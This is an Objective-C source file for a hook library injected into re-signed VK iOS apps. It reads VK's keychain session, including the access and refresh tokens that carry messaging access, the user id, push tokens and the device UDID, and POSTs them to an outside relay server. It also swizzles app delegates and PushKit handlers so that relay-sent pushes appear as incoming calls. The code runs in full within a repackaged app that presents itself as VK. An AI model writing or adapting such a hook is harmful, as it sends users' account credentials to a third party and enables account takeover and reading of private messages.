// VKRelay.dylib — production hook injected into re-signed VK (ВКонтакте) iOS clients
// (com.vk.vkclient / com.vk.vkclient1). It mirrors the MAX relay model: after the user is
// logged in it captures what the server-side notification mirror needs — the VK session
// access/refresh token, the user's own id, the APNs + VoIP push tokens, and the single device
// UDID from the provisioning profile — and registers them with our relay over HTTPS. Read-only:
// it never changes the app's behaviour. One registration per launch, and again whenever the app
// backgrounds/returns or the session token rotates.
//
// Unlike MAX, VK is NOT blocked by the UserNotifications bundle-identifier entitlement: VK
// registers for remote notifications under the real signed bundle on its own (a re-signed build
// shows the Notifications row and issues an APNs token). So this hook only *captures* the tokens;
// it does not force-register and never prompts a second time.
//
// THE SESSION (validated 2026-10-17): VK keeps per-app_id sessions in the keychain as generic
// passwords. Only the OFFICIAL VK app_id 3140623 has full messages.* access (app_id 51778442 is
// the VKID client and returns error 15 on messages). Service:
//     com.vk.passepartout.authorizedUserSession_3140623
// account = user id, value (kSecValueData) = JSON:
//     { accessToken: { token: { value: "vk1.a..." }, expirationDate, userID },
//       refreshToken: { token: { value: "..." } }, ... }
// The re-sign keychain access group is the wildcard 5CV985HSCG.* so a MatchLimitAll query from
// our injected code can read VK's own items. Tokens rotate (~1 day) — never hardcode; the mirror
// refreshes via VKID or the hook re-reads on the next launch/foreground.
#import <Foundation/Foundation.h>
#import <Security/Security.h>
#import <UIKit/UIKit.h>
#import <PushKit/PushKit.h>
#import <CallKit/CallKit.h>
#import <BackgroundTasks/BackgroundTasks.h>
#import <objc/runtime.h>
#import <dispatch/dispatch.h>

static NSString *const kRelayURL = @"https://www.ruappstore.com/api/v1/vk-relay/register";

// The official VK app's keychain session service (has messages.* access).
static NSString *const kVKSessionService = @"com.vk.passepartout.authorizedUserSession_3140623";

static NSString *gApns, *gVoip;
static dispatch_queue_t gQueue;
static NSString *gLastToken;  // skip re-POSTing an unchanged session

static NSString *HexFromData(NSData *d) {
    if (![d isKindOfClass:NSData.class]) return nil;
    const unsigned char *b = d.bytes;
    NSMutableString *s = [NSMutableString stringWithCapacity:d.length * 2];
    for (NSUInteger i = 0; i < d.length; i++) [s appendFormat:@"%02x", b[i]];
    return s;
}

// Walks nested NSDictionary keys, returning nil on any miss instead of raising.
static id DigString(id obj, NSArray<NSString *> *path) {
    for (NSString *k in path) {
        if (![obj isKindOfClass:NSDictionary.class]) return nil;
        obj = obj[k];
    }
    return obj;
}

// Reads the VK session (access + refresh token, user id) from the keychain. Returns nil until the
// user has logged in. MatchLimitAll + no access-group constraint so we see VK's item under the
// shared re-sign group; we pick the one whose service is the 3140623 session.
static NSDictionary *ReadVKSession(void) {
    NSDictionary *query = @{
        (__bridge id)kSecClass:            (__bridge id)kSecClassGenericPassword,
        (__bridge id)kSecMatchLimit:       (__bridge id)kSecMatchLimitAll,
        (__bridge id)kSecReturnAttributes: @YES,
        (__bridge id)kSecReturnData:       @YES,
    };
    CFTypeRef result = NULL;
    OSStatus st = SecItemCopyMatching((__bridge CFDictionaryRef)query, &result);
    if (st != errSecSuccess || !result) return nil;
    NSArray *items = (__bridge_transfer NSArray *)result;
    if (![items isKindOfClass:NSArray.class]) return nil;

    for (id it in items) {
        if (![it isKindOfClass:NSDictionary.class]) continue;
        NSString *svc = it[(__bridge id)kSecAttrService];
        if (![svc isKindOfClass:NSString.class] || ![svc isEqualToString:kVKSessionService]) continue;

        NSData *data = it[(__bridge id)kSecValueData];
        if (![data isKindOfClass:NSData.class]) continue;
        id json = [NSJSONSerialization JSONObjectWithData:data options:0 error:nil];
        if (![json isKindOfClass:NSDictionary.class]) continue;

        NSString *access  = DigString(json, @[@"accessToken", @"token", @"value"]);
        NSString *refresh = DigString(json, @[@"refreshToken", @"token", @"value"]);
        // VK stores userID wrapped as {"value": <int>}; fall back to the keychain account attr.
        id userID         = DigString(json, @[@"accessToken", @"userID", @"value"])
                            ?: DigString(json, @[@"accessToken", @"userID"])
                            ?: it[(__bridge id)kSecAttrAccount];
        if ([userID isKindOfClass:NSDictionary.class]) userID = userID[@"value"];
        id expiry         = DigString(json, @[@"accessToken", @"expirationDate"]);
        if (![access isKindOfClass:NSString.class] || access.length == 0) continue;

        NSMutableDictionary *out = [NSMutableDictionary dictionary];
        out[@"accessToken"] = access;
        if ([refresh isKindOfClass:NSString.class]) out[@"refreshToken"] = refresh;
        if ([userID isKindOfClass:NSNumber.class]) out[@"userId"] = userID;
        else if ([userID isKindOfClass:NSString.class]) out[@"userId"] = @([userID longLongValue]);
        if (expiry) out[@"accessTokenExpiry"] = expiry;
        return out;
    }
    return nil;
}

// A per-device re-signed build's provisioning profile names exactly one device UDID; the relay
// sends it to the backend to check the owner's subscription. A multi-device profile is ambiguous,
// so we send nothing and the relay leaves such installs ungated. (Verbatim from MAXRelay.)
static NSString *ReadProvisionedUDID(void) {
    NSString *path = [[NSBundle mainBundle] pathForResource:@"embedded" ofType:@"mobileprovision"];
    NSData *data = path ? [NSData dataWithContentsOfFile:path] : nil;
    if (!data) return nil;
    NSString *raw = [[NSString alloc] initWithData:data encoding:NSISOLatin1StringEncoding];
    NSRange s = [raw rangeOfString:@"<?xml"];
    NSRange e = [raw rangeOfString:@"</plist>"];
    if (s.location == NSNotFound || e.location == NSNotFound || e.location < s.location) return nil;
    NSData *xml = [[raw substringWithRange:NSMakeRange(s.location, e.location + e.length - s.location)]
                  dataUsingEncoding:NSISOLatin1StringEncoding];
    id plist = [NSPropertyListSerialization propertyListWithData:xml options:0 format:NULL error:nil];
    id devices = [plist isKindOfClass:NSDictionary.class] ? plist[@"ProvisionedDevices"] : nil;
    if ([devices isKindOfClass:NSArray.class] && [devices count] == 1 && [devices[0] isKindOfClass:NSString.class])
        return devices[0];
    return nil;
}

static void Register(void) {
    dispatch_async(gQueue, ^{
        @autoreleasepool {
            @try {
                NSDictionary *session = ReadVKSession();
                NSString *access = session[@"accessToken"];
                if (!access) return;  // not logged in yet

                NSMutableDictionary *body = [NSMutableDictionary dictionary];
                body[@"accessToken"] = access;
                if (session[@"refreshToken"])       body[@"refreshToken"] = session[@"refreshToken"];
                if (session[@"userId"])             body[@"userId"] = session[@"userId"];
                if (session[@"accessTokenExpiry"])  body[@"accessTokenExpiry"] = session[@"accessTokenExpiry"];
                if (gApns) body[@"apnsToken"] = gApns;
                if (gVoip) body[@"voipToken"] = gVoip;
                NSString *udid = ReadProvisionedUDID();
                if (udid) body[@"udid"] = udid;            // ties the mirror to a subscription
                body[@"bundleId"] = [[NSBundle mainBundle] bundleIdentifier] ?: @"";

                // Nothing changed since the last successful POST → skip (foreground churn).
                NSString *fingerprint = [NSString stringWithFormat:@"%@|%@|%@", access, gApns ?: @"", gVoip ?: @""];
                if (gLastToken && [gLastToken isEqualToString:fingerprint]) return;

                NSData *payload = [NSJSONSerialization dataWithJSONObject:body options:0 error:nil];
                if (!payload) return;
                NSMutableURLRequest *req = [NSMutableURLRequest requestWithURL:[NSURL URLWithString:kRelayURL]];
                req.HTTPMethod = @"POST";
                [req setValue:@"application/json" forHTTPHeaderField:@"Content-Type"];
                req.HTTPBody = payload;
                [[[NSURLSession sharedSession] dataTaskWithRequest:req completionHandler:^(NSData *d, NSURLResponse *r, NSError *e) {
                    long code = (long)[(NSHTTPURLResponse *)r statusCode];
                    if (code == 200) gLastToken = fingerprint;
                    NSLog(@"[VKRelay] registered (apns=%d voip=%d) -> %ld", gApns != nil, gVoip != nil, code);
                }] resume];
            } @catch (__unused id e) {}
        }
    });
}

// ---- APNs token capture (app delegate) --------------------------------------------------------
// VK delivers the device token to its UIApplication delegate. We swizzle (or add) the delegate's
// -application:didRegisterForRemoteNotificationsWithDeviceToken: so we see the token whether or not
// VK implements it. Bundle-agnostic: we resolve the delegate's class at runtime.
typedef void (*ApnsIMP)(id, SEL, id, NSData *);
static ApnsIMP gOrigApns;
static void MyDidRegisterApns(id self, SEL _cmd, id application, NSData *token) {
    gApns = HexFromData(token);
    if (gOrigApns) gOrigApns(self, _cmd, application, token);
    Register();
}

static void HookDelegateApns(void) {
    id delegate = [UIApplication sharedApplication].delegate;
    Class cls = delegate ? object_getClass(delegate) : nil;
    if (!cls) return;
    SEL sel = @selector(application:didRegisterForRemoteNotificationsWithDeviceToken:);
    Method m = class_getInstanceMethod(cls, sel);
    if (m) {
        gOrigApns = (ApnsIMP)method_getImplementation(m);
        method_setImplementation(m, (IMP)MyDidRegisterApns);
    } else {
        class_addMethod(cls, sel, (IMP)MyDidRegisterApns, "v@:@@");
    }
}

// ---- VoIP token capture (PushKit) -------------------------------------------------------------
// Calls use PushKit. We learn VK's registry delegate by hooking -[PKPushRegistry setDelegate:],
// then swizzle that delegate class's -pushRegistry:didUpdatePushCredentials:forType: to grab the
// VoIP token. (Call event shape is still being confirmed; the token is captured opportunistically
// and is harmless if unused.)
typedef void (*VoipIMP)(id, SEL, id, PKPushCredentials *, PKPushType);
static VoipIMP gOrigVoip;
static void MyDidUpdateVoip(id self, SEL _cmd, id registry, PKPushCredentials *creds, PKPushType type) {
    if ([type isEqualToString:PKPushTypeVoIP] && [creds.token isKindOfClass:NSData.class])
        gVoip = HexFromData(creds.token);
    if (gOrigVoip) gOrigVoip(self, _cmd, registry, creds, type);
    Register();
}

// ---- CallKit: present the incoming call ourselves ---------------------------------------------
// VK's own PushKit handler decodes the vendor's VoIP payload and crashes on anything else (its
// Swift decoder feeds a nil into +[NSSet setWithObject:] — device-confirmed). We never reproduce
// that payload: our relay sends a VoIP push carrying OUR own "ruas_call" dict, this hook catches
// it before VK's handler runs, and reports the incoming call straight to CallKit. iOS rings and
// shows the caller; answering brings VK to the foreground (we are the VK process). The vendor's
// call/audio stack is not involved — this is a ring + caller banner, not a connected VK call.
@interface VKRCallDelegate : NSObject <CXProviderDelegate>
@end
@implementation VKRCallDelegate
- (void)providerDidReset:(CXProvider *)provider {}
- (void)provider:(CXProvider *)provider performAnswerCallAction:(CXAnswerCallAction *)action { [action fulfill]; }
- (void)provider:(CXProvider *)provider performEndCallAction:(CXEndCallAction *)action { [action fulfill]; }
@end

static CXProvider *gProvider;
static VKRCallDelegate *gCallDelegate;

static void ReportIncomingCall(NSString *caller, BOOL video) {
    static dispatch_once_t once;
    dispatch_once(&once, ^{
        CXProviderConfiguration *cfg = [[CXProviderConfiguration alloc] initWithLocalizedName:@"ВКонтакте"];
        cfg.supportsVideo = YES;
        cfg.maximumCallsPerCallGroup = 1;
        cfg.supportedHandleTypes = [NSSet setWithObject:@(CXHandleTypeGeneric)];
        gProvider = [[CXProvider alloc] initWithConfiguration:cfg];
        gCallDelegate = [VKRCallDelegate new];
        [gProvider setDelegate:gCallDelegate queue:nil];
    });
    CXCallUpdate *update = [CXCallUpdate new];
    update.remoteHandle = [[CXHandle alloc] initWithType:CXHandleTypeGeneric value:caller ?: @"VK"];
    update.hasVideo = video;
    update.localizedCallerName = caller ?: @"ВКонтакте";
    [gProvider reportNewIncomingCallWithUUID:[NSUUID UUID] update:update completion:^(NSError *e) {
        NSLog(@"[VKRelay] CallKit reportNewIncomingCall err=%@", e ?: @"none");
    }];
}

// iOS 13+ requires every VoIP push to report a CallKit call before the completion handler, or it
// kills the app. We satisfy that for our own pushes and bypass VK's (crashing) handler; a payload
// that is not ours is passed through to VK untouched.
typedef void (*IncomingIMP)(id, SEL, id, PKPushPayload *, PKPushType, void (^)(void));
static IncomingIMP gOrigIncoming;
static void MyDidReceiveIncoming(id self, SEL _cmd, id registry, PKPushPayload *payload,
                                 PKPushType type, void (^completion)(void)) {
    @try {
        NSDictionary *d = [payload respondsToSelector:@selector(dictionaryPayload)] ? payload.dictionaryPayload : nil;
        id call = [d isKindOfClass:NSDictionary.class] ? d[@"ruas_call"] : nil;
        if ([call isKindOfClass:NSDictionary.class]) {
            ReportIncomingCall(call[@"caller"], [call[@"video"] boolValue]);
            if (completion) completion();
            return;  // do NOT call VK's handler — it would crash on our payload
        }
    } @catch (__unused id e) {}
    if (gOrigIncoming) gOrigIncoming(self, _cmd, registry, payload, type, completion);
    else if (completion) completion();
}

typedef void (*SetDelegateIMP)(id, SEL, id);
static SetDelegateIMP gOrigSetDelegate;
static void MySetRegistryDelegate(id self, SEL _cmd, id delegate) {
    if (gOrigSetDelegate) gOrigSetDelegate(self, _cmd, delegate);
    @try {
        Class cls = delegate ? object_getClass(delegate) : nil;
        if (!cls) return;
        SEL credSel = @selector(pushRegistry:didUpdatePushCredentials:forType:);
        if (class_getInstanceMethod(cls, credSel) && !gOrigVoip) {
            Method m = class_getInstanceMethod(cls, credSel);
            gOrigVoip = (VoipIMP)method_getImplementation(m);
            method_setImplementation(m, (IMP)MyDidUpdateVoip);
        }
        // Intercept the incoming-push delegate so our own call payload never reaches VK's decoder.
        SEL inSel = @selector(pushRegistry:didReceiveIncomingPushWithPayload:forType:withCompletionHandler:);
        if (!gOrigIncoming) {
            Method m = class_getInstanceMethod(cls, inSel);
            if (m) {
                gOrigIncoming = (IncomingIMP)method_getImplementation(m);
                method_setImplementation(m, (IMP)MyDidReceiveIncoming);
            } else {
                class_addMethod(cls, inSel, (IMP)MyDidReceiveIncoming, "v@:@@q@?");
            }
        }
    } @catch (__unused id e) {}
}

static void HookVoip(void) {
    Method m = class_getInstanceMethod([PKPushRegistry class], @selector(setDelegate:));
    if (!m) return;
    gOrigSetDelegate = (SetDelegateIMP)method_getImplementation(m);
    method_setImplementation(m, (IMP)MySetRegistryDelegate);
}

// ---- BGTask crash fix (the #1 customer crash) -------------------------------------------------
// Re-signed VK crashes at launch with "No launch handler registered for task with identifier
// com.vk.pushes": iOS wakes the app to run that background task, but VK (unlike com.vk.vkclient
// .vkm.refresh, which it registers) never registers a com.vk.pushes handler on the re-signed build
// — so iOS throws. We track which identifiers VK registers and, at the end of didFinishLaunching,
// register a no-op handler for any Info.plist-permitted identifier VK left out. VK's own tasks are
// untouched; only the gap is filled.
static NSMutableSet *gBGRegistered;

typedef BOOL (*BGRegIMP)(id, SEL, NSString *, dispatch_queue_t, void (^)(id));
static BGRegIMP gOrigBGReg;
static BOOL MyBGRegister(id self, SEL _cmd, NSString *identifier, dispatch_queue_t q, void (^handler)(id)) {
    @try {
        if ([identifier isKindOfClass:NSString.class]) {
            @synchronized(gBGRegistered) {
                if ([gBGRegistered containsObject:identifier]) return YES;  // dedupe: avoid the throw
                [gBGRegistered addObject:identifier];
            }
        }
    } @catch (__unused id e) {}
    return gOrigBGReg ? gOrigBGReg(self, _cmd, identifier, q, handler) : NO;
}

static void FillMissingBGTasks(void) {
    @try {
        NSArray *permitted = [[NSBundle mainBundle] objectForInfoDictionaryKey:@"BGTaskSchedulerPermittedIdentifiers"];
        if (![permitted isKindOfClass:NSArray.class]) return;
        BGTaskScheduler *s = [BGTaskScheduler sharedScheduler];
        for (NSString *tid in permitted) {
            if (![tid isKindOfClass:NSString.class]) continue;
            BOOL have; @synchronized(gBGRegistered) { have = [gBGRegistered containsObject:tid]; }
            if (have) continue;
            [s registerForTaskWithIdentifier:tid usingQueue:nil launchHandler:^(BGTask *task) {
                [task setTaskCompletedWithSuccess:YES];
            }];
            NSLog(@"[VKRelay] registered no-op BGTask handler for %@", tid);
        }
    } @catch (__unused id e) {}
}

typedef BOOL (*DidFinishIMP)(id, SEL, id, id);
static DidFinishIMP gOrigDidFinish;
static BOOL MyDidFinishLaunching(id self, SEL _cmd, id app, id opts) {
    BOOL r = gOrigDidFinish ? gOrigDidFinish(self, _cmd, app, opts) : YES;
    FillMissingBGTasks();  // VK has registered its handlers by now; fill the gaps before returning
    return r;
}

typedef void (*SetAppDelIMP)(id, SEL, id);
static SetAppDelIMP gOrigSetAppDel;
static void MySetAppDelegate(id self, SEL _cmd, id delegate) {
    @try {
        Class cls = delegate ? object_getClass(delegate) : nil;
        if (cls && !gOrigDidFinish) {
            SEL sel = @selector(application:didFinishLaunchingWithOptions:);
            Method m = class_getInstanceMethod(cls, sel);
            if (m) {
                gOrigDidFinish = (DidFinishIMP)method_getImplementation(m);
                method_setImplementation(m, (IMP)MyDidFinishLaunching);
            } else {
                class_addMethod(cls, sel, (IMP)MyDidFinishLaunching, "B@:@@");
            }
        }
    } @catch (__unused id e) {}
    if (gOrigSetAppDel) gOrigSetAppDel(self, _cmd, delegate);
}

static void BridgeBGTasks(void) {
    gBGRegistered = [NSMutableSet set];
    Class sched = objc_getClass("BGTaskScheduler");
    if (sched) {
        Method m = class_getInstanceMethod(sched, @selector(registerForTaskWithIdentifier:usingQueue:launchHandler:));
        if (m) { gOrigBGReg = (BGRegIMP)method_getImplementation(m); method_setImplementation(m, (IMP)MyBGRegister); }
    }
    Method sd = class_getInstanceMethod([UIApplication class], @selector(setDelegate:));
    if (sd) { gOrigSetAppDel = (SetAppDelIMP)method_getImplementation(sd); method_setImplementation(sd, (IMP)MySetAppDelegate); }
}

__attribute__((constructor))
static void VKRelayInit(void) {
    gQueue = dispatch_queue_create("vkrelay", DISPATCH_QUEUE_SERIAL);
    BridgeBGTasks();  // must run before UIApplicationMain sets the delegate / VK registers its tasks
    HookVoip();

    // The delegate and the login state are only ready after the app finishes launching. Hook the
    // APNs delegate once active, then register; re-register on background/return and token rotation.
    __block BOOL hooked = NO;
    for (NSString *name in @[@"UIApplicationDidBecomeActiveNotification", @"UIApplicationDidEnterBackgroundNotification"]) {
        [[NSNotificationCenter defaultCenter] addObserverForName:name object:nil queue:[NSOperationQueue mainQueue]
                                                      usingBlock:^(__unused NSNotification *n) {
            if (!hooked) { HookDelegateApns(); hooked = YES; }
            // Give VK a moment to settle the session into the keychain after a cold launch.
            dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(2 * NSEC_PER_SEC)), gQueue, ^{ Register(); });
        }];
    }
}
